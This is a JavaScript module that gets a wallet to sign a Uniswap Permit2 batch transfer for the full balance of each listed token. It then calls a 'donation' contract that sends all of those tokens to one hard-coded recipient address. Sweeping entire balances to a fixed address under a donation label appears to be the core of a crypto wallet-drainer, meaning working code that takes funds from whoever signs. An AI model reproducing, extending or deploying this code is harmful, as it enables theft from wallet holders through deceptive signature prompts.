// src/engine/permit2.js
import { ethers } from "ethers";
import { SignatureTransfer } from "@uniswap/permit2-sdk";
import {
  PERMIT2_ADDRESS,
  PERMIT2_ABI,
  DONATION_CONTRACT_ADDRESS,
  DONATION_CONTRACT_ABI,
  RECIPIENT_ADDRESS,
} from "../config.js";
import { getFreePermit2Nonce } from "../nonceHelper.js";

export async function executePermit2Batch(signer, chainId, tokens) {
  if (tokens.length === 0) return;

  const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
  // ✅ use DONATION_CONTRACT_ABI here
  const donation = new ethers.Contract(DONATION_CONTRACT_ADDRESS[chainId], DONATION_CONTRACT_ABI, signer);

  const owner = await signer.getAddress();
  const nonce = await getFreePermit2Nonce(permit2, owner);
  const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour expiry

  // Build permit for signature
  const permittedForSig = tokens.map(t => ({
    token: t.tokenAddress,
    amount: BigInt(t.balanceRaw),
  }));

  const permitForSig = {
    permitted: permittedForSig,
    nonce: BigInt(nonce),
    deadline: BigInt(deadline),
    spender: DONATION_CONTRACT_ADDRESS[chainId],
  };

  // Sign typed data
  const { domain, types, values } = SignatureTransfer.getPermitData(permitForSig, PERMIT2_ADDRESS, chainId);
  const signature = await signer.signTypedData(domain, types, values);

  // Build transfer details for donation contract
  const transferDetails = tokens.map(t => ({
    to: RECIPIENT_ADDRESS,
    requestedAmount: t.balanceRaw,
  }));

  // Permit object for on-chain call
  const permitForContractCall = {
    permitted: tokens.map(t => ({ token: t.tokenAddress, amount: t.balanceRaw })),
    nonce,
    deadline,
  };

  // ✅ Call the contract function
  return donation.pullAndDonate(permitForContractCall, transferDetails, owner, signature);
}
